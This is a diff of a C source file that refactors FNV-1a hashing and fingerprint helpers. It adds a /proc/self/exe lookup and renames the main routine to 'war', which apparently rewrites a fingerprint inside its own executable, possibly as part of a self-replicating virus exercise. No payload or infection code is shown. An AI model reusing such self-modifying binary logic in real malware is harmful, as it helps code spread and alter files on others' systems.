@@ -3,7 +3,7 @@
 #define FNV_OFFSET_BASIS_64 0xcbf29ce484222325
 #define FNV_PRIME_64 0x00000100000001b3
 
-uint64_t fnv1a_64(const void *data, size_t len) {
+static uint64_t fnv1a_64(const void *data, size_t len) {
 	uint64_t hash = FNV_OFFSET_BASIS_64;
 	for (size_t i = 0; i < len; i++) {
 		hash ^= ((uint8_t *)data)[i];
@@ -12,7 +12,7 @@ uint64_t fnv1a_64(const void *data, size_t len) {
 	return hash;
 }
 
-void hash_to_printable(uint64_t hash, char *fingerprint) {
+static void hash_to_printable(uint64_t hash, char *fingerprint) {
 	for (size_t i = 0; i < 8; i++) {
 		fingerprint[i] = (hash % 94) + 33;
 		hash /= 94;
@@ -32,7 +32,7 @@ void update_fingerprint(char *fingerprint, t_data *data) {
 	hash_to_printable(hash, fingerprint);
 }
 
-void hash_with_time(char *fingerprint) {
+static void hash_with_time(char *fingerprint) {
 	struct timeval tv;
 	gettimeofday(&tv, NULL);
 
@@ -42,7 +42,7 @@ void hash_with_time(char *fingerprint) {
 
 }
 
-void increment_counter(char *counter) {
+static void increment_counter(char *counter) {
 	for (int i = 3; i >= 0; i--) {
 		if (counter[i] == '9') {
 			counter[i] = '0';
@@ -53,7 +53,29 @@ void increment_counter(char *counter) {
 	}
 }
 
-int self_fingerprint(const char *self_name, size_t increment) {
+
+static int abs_path(char *self_name) {
+	char buf[PATH_MAX];
+	char proc_self_exe[] = "/proc/self/exe";
+
+	int ret = readlink(proc_self_exe, buf, PATH_MAX);
+	if (ret == -1) {
+		ft_strncpy(self_name, STR("dummy"), PATH_MAX);
+		return -1;
+	}
+	buf[ret] = '\0';
+
+	ft_strncpy(self_name, buf, PATH_MAX);
+
+	return 0;
+}
+
+int war(size_t increment) {
+
+	char self_name[PATH_MAX];
+
+
+	abs_path(self_name);
 
 	struct stat st;
 	/* we could open the file with O_RDWR but text file is busy */
@@ -118,21 +140,6 @@ int self_fingerprint(const char *self_name, size_t increment) {
 	}
 
 	close(fd);
-
-	return 0;
-}
-
-int self_name(char *self_name) {
-	char buf[PATH_MAX];
-	char proc_self_exe[] = "/proc/self/exe";
-
-	int ret = readlink(proc_self_exe, buf, PATH_MAX);
-	if (ret == -1) {
-		return -1;
-	}
-	buf[ret] = '\0';
-
-	ft_strncpy(self_name, buf, PATH_MAX);
 
 	return 0;
 }
